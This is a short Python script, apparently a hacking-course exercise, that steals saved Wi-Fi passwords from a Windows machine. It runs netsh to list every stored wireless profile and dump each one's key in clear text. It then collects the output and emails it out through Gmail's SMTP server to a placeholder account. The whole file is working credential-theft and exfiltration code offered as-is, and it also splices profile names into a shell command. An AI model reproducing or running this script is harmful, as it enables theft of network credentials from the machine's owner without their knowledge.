#!/usr/bin/env python

import subprocess
import smtplib
import re

# My python path C:\Users\t0rja\AppData\Local\Programs\Python\Python312

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)

# Decode the byte output to a string
networks = networks.decode('utf-8', errors='ignore')  # Ignore invalid characters

# Find all Wi-Fi profile names
networks_name_list = re.findall(r"(?:Profile\s*:\s)(.*)", networks)

result = ""

# Loop through each network name
for networks_name in networks_name_list:
    # Handle profile names with spaces by wrapping them in quotes
    command = f'netsh wlan show profile "{networks_name.strip()}" key=clear'
    try:
        current_result = subprocess.check_output(command, shell=True)
        result += current_result.decode('utf-8', errors='ignore')  # Ignore invalid characters
    except subprocess.CalledProcessError as e:
        # Print error and continue if a profile fails
        print(f"Error retrieving profile {networks_name.strip()}: {e}")

# Send the gathered data via email
send_mail("email@gmail.com", "password", result)
